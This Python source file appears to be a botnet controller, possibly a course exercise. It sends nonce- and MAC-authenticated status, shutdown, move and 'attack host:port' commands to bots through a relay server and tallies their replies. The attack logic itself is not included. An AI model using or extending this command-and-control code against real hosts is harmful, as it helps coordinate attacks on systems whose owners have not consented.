import socket
import sys
import random
import hashlib
import time
import select

used_nonces = set()
secret = ""

def generate_nonce():

    while True: 
        nonce = random.randint(0, 999)
        if nonce not in used_nonces:
            used_nonces.add(nonce)
            return nonce


def create_mac(nonce):
    return hashlib.sha256((nonce + secret).encode()).hexdigest()[:8]

def listen(soc):
    print("Waiting 5s to gather replies.")
    response = []
    start_time = time.time()

    soc.setblocking(False)

    while time.time() - start_time < 5:
        try:
            data = soc.recv(4096).decode().strip()
            if data:
                response.extend(data.splitlines())
        except BlockingIOError:
            time.sleep(0.1)    
    
    return response

def handle_status(socket):

    nonce = str(generate_nonce())
    mac = create_mac(nonce)
    socket.sendall((nonce + " " + mac + " status" + "\n").encode())
    response = listen(socket)

    print(response)
    print(f"Result: {len(response)} bots replied.")
    
    formatted = [f"{resp.split()[1]} ({resp.split()[2]})" for resp in response]
    print(", ".join(formatted))  

    return

def handle_shutdown(socket):
    nonce = str(generate_nonce())
    mac = create_mac(nonce)
    socket.sendall((nonce + " " + mac + " shutdown" + "\n").encode())
    response = listen(socket)

    print(f"Result: {len(response)} bots shut down.")
    
    formatted = [f"{resp.split()[1]}" for resp in response]
    print(", ".join(formatted))

    return

def handle_attack(socket, host, port):
    nonce = str(generate_nonce())
    mac = create_mac(nonce)
    socket.sendall((nonce + " " + mac + " attack " + host + ":" + port  + " \n").encode())
    response = listen(socket)

    success = []
    failure = []

    for resp in response:
        parts = resp.split()
        err_msg = " ".join(parts[2:])
        if parts[2] == "OK":
            success.append(parts[1])
        else:
            failure.append(f"{parts[1]}: {err_msg}")
    
    print(f"Result: {len(success)} bots attacked successfully: ")
    print(", ".join(success))

    print(f"{len(failure)} bots failed to attack: ")
    for fail in failure:
        print(fail)
        
    return

def handle_move(socket, host, port):
    nonce = str(generate_nonce())
    mac = create_mac(nonce)
    socket.sendall((nonce + " " + mac + " move " + host + ":" + port  + " \n").encode())
    response = listen(socket)

    print(f"Result: {len(response)} bots moved.")
    formatted = [f"{resp.split()[1]}" for resp in response]
    print(", ".join(formatted))
    
    return

def handle_client(socket):

    while True:
        cmd = input("cmd> ").strip()
        parts = cmd.split()

        command = parts[0]
        if command == "status":
            handle_status(socket)
        elif command == "shutdown":
            handle_shutdown(socket)
        elif command == "attack":
            host, port = parts[1].split(":")
            handle_attack(socket, host, port)
        elif command == "move":
            host, port = parts[1].split(":")
            handle_move(socket, host, port)
        elif command == "quit":
            print("Disconnected")
            sys.exit(0)
        else:
            print("invalid command or invalid usage")

    sock.close()

def gather_replies():
    return

def start_botController(host, port):
    try:

        server = socket.create_connection((host, port))
        server.sendall(("-bot_controller connected \n").encode())
        print(f"Connected to server at {host}:{port}")
        handle_client(server)

    except Exception as e:
        print(e)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./ncbot.py <hostname>:<port> <secret-phrase>")
        sys.exit(1)
    
    hostname, port = sys.argv[1].split(":")
    port = int(port)
    secret = sys.argv[2]

    start_botController(hostname, port)
